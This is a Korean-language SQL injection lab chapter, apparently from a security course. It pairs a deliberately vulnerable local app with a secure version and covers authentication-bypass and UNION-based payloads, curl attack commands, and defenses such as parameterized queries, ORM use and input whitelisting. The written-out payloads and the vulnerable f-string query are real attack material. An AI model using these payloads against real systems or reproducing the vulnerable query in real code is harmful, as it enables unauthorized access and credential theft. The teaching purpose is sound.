# Chapter 04: SQL Injection 실습

## 학습 목표
- SQL Injection 취약점의 원리 이해
- 공격 기법 실습 (Authentication Bypass, UNION-based)
- Parameterized Query와 ORM을 활용한 방어 구현

## 실습 환경 실행

```bash
cd ch04-sql-injection
# 취약한 버전과 안전한 버전 동시 실행
docker-compose up -d

# 취약한 버전: http://localhost:5001
# 안전한 버전: http://localhost:5002
```

## 실습 1: Authentication Bypass

### 취약한 코드 (vulnerable/app.py:42)
```python
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
```

### 공격 방법
1. http://localhost:5001 접속
2. Username: `' OR '1'='1`
3. Password: 아무 값

### 예상 결과
- 비밀번호 없이 로그인 성공
- 실행된 쿼리: `SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '...'`

## 실습 2: UNION-based SQL Injection

### 공격 방법
1. 검색창에 입력 (검색 쿼리는 3개 컬럼 반환):
```
' UNION SELECT id, username, password FROM users--
```

### 예상 결과
- email 필드에 password가 노출됨
- 실행된 쿼리: `SELECT id, username, email FROM users WHERE username LIKE '%' UNION SELECT id, username, password FROM users--%'`

### 추가 공격 예시
```sql
-- 모든 사용자 정보 추출 (3컬럼 맞춤)
' UNION SELECT id, username || ':' || password, role FROM users--

-- 테이블 정보 추출 (SQLite)
' UNION SELECT 1, name, sql FROM sqlite_master--
```

## 방어 기법

### 1. Parameterized Query (권장)
```python
cursor.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password))
```

### 2. ORM 사용 (secure/app.py)
```python
user = User.query.filter_by(username=username).first()
```

### 3. 입력값 검증
```python
def validate_username(username: str) -> bool:
    return bool(re.match(r"^[a-zA-Z0-9_]+$", username))
```

## 체크리스트

- [ ] 문자열 포맷팅으로 쿼리 생성하지 않기
- [ ] Parameterized Query 또는 ORM 사용
- [ ] 입력값 화이트리스트 검증
- [ ] 에러 메시지에서 쿼리 정보 숨기기
- [ ] 최소 권한 DB 계정 사용

## 테스트 방법

### 1. pytest 실행 (권장)
```bash
cd ch04-sql-injection
pytest test_app.py -v
```

**예상 출력:**
```
test_app.py::TestVulnerableApp::test_index PASSED                    [ 16%]
test_app.py::TestVulnerableApp::test_login_valid PASSED              [ 33%]
test_app.py::TestVulnerableApp::test_search PASSED                   [ 50%]
test_app.py::TestSecureApp::test_index PASSED                        [ 66%]
test_app.py::TestSecureApp::test_login_valid PASSED                  [ 83%]
test_app.py::TestSecureApp::test_search PASSED                       [100%]

============================== 6 passed in 0.48s ==============================
```

**테스트 항목:**
| 테스트 | 설명 | 결과 |
|--------|------|------|
| `test_index` | 메인 페이지 (/) 접근 테스트 | 두 버전 모두 통과 |
| `test_login_valid` | 정상 로그인 (alice/password) 테스트 | 두 버전 모두 통과 |
| `test_search` | 검색 기능 기본 테스트 | 두 버전 모두 통과 |

**개별 테스트 실행:**
```bash
# 취약한 버전만 테스트
pytest test_app.py::TestVulnerableApp -v

# 안전한 버전만 테스트
pytest test_app.py::TestSecureApp -v

# SQL Injection 수동 테스트 (pytest로는 공격 테스트 안함)
# 실제 공격 테스트는 Docker 또는 수동 테스트 섹션 참고
```

### 2. Docker 테스트
```bash
cd ch04-sql-injection
docker-compose up -d

# 취약한 버전 - Authentication Bypass
curl -X POST http://localhost:5001/login \
  -d "username=' OR '1'='1&password=anything"

# 취약한 버전 - UNION Injection
curl "http://localhost:5001/search?q=' UNION SELECT id, username, password FROM users--"

# 안전한 버전 테스트
curl -X POST http://localhost:5002/login \
  -d "username=' OR '1'='1&password=anything"

docker-compose down
```

### 3. 수동 테스트
1. http://localhost:5001 접속
2. Username: `' OR '1'='1`, Password: 아무 값
3. 로그인 성공 확인 (취약점)
4. http://localhost:5002에서 동일 테스트
5. 로그인 실패 확인 (방어 성공)

## 참고 자료
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [SQLAlchemy Documentation](https://docs.sqlalchemy.org/)
